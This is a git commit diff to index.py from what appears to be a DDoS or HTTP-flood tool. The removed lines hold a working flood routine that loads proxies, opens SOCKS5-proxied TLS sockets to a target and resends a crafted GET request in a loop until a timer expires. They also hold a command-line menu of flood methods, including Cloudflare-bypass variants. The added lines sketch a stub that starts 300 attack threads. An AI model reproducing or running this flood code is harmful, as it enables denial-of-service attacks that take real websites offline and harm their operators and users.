7cdb909f1d7e4de71bde4bb8081f66a061063efc
Abin Karukappallil <followgamer102@gmail.com>
2024-03-25 20:34:25 +0530

    method building

--- index.py
+++ index.py
@@ -1,67 +1,7 @@
-from os import system, name
-import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx
-from urllib.parse import urlparse
-from requests.cookies import RequestsCookieJar
-import undetected_chromedriver as webdriver
-from sys import stdout
-from colorama import Fore, init
-
-def get_proxies():
-    global proxies
-    if not os.path.exists("./proxy.txt"):
-        stdout.write(Fore.MAGENTA+" [*]"+Fore.WHITE+" You Need Proxy File ( ./proxy.txt )\n")
-        return False
-    proxies = open("./proxy.txt", 'r').read().split('\n')
-    return True
-def attackSKY(url, timer, threads):
-    for i in range(int(threads)):
-        threading.Thread(target=LaunchSKY, args=(url, timer)).start()
-
-def LaunchSKY(url, timer):
+def atk(url, timer, packet):
+   for i in range(int(300)):
+       threading.Thread(target=attk, args=(url, timer)).start()
+       
+def attk(url, timer):
     proxy = random.choice(proxies).strip().split(":")
-    timelol = time.time() + int(timer)
-    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
-    req += "Cache-Control: no-cache\r\n"
-    req += "User-Agent: " + random.choice(ua) + "\r\n"
-    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
-    req += "Sec-Fetch-Site: same-origin\r\n"
-    req += "Sec-GPC: 1\r\n"
-    req += "Sec-Fetch-Mode: navigate\r\n"
-    req += "Sec-Fetch-Dest: document\r\n"
-    req += "Upgrade-Insecure-Requests: 1\r\n"
-    req += "Connection: Keep-Alive\r\n\r\n"
-    while time.time() < timelol:
-        try:
-            s = socks.socksocket()
-            s.connect((str(urlparse(url).netloc), int(443)))
-            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            ctx = ssl.SSLContext()
-            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
-            s.send(str.encode(req))
-            try:
-                for _ in range(100):
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-            except:
-                s.close()
-        except:
-            s.close()
-if __name__ == '__main__':
-    init(convert=True)
-    if len(sys.argv) < 2:
-        ua = open('./resources/ua.txt', 'r').read().split('\n')
-        clear()
-        title()
-        while True:
-            command()
-    elif len(sys.argv) == 5:
-        pass
-    else:
-        stdout.write("Method: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")
-        stdout.write(f"usage:~# python3 {sys.argv[0]} <method> <target> <thread> <time>\n")
-        sys.exit()
-    ua = open('./resources/ua.txt', 'r').read().split('\n')
-    method = sys.argv[1].rstrip()
-    target = sys.argv[2].rstrip()
-    thread = sys.argv[3].rstrip()
-    t      = sys.argv[4].rstrip()
+    
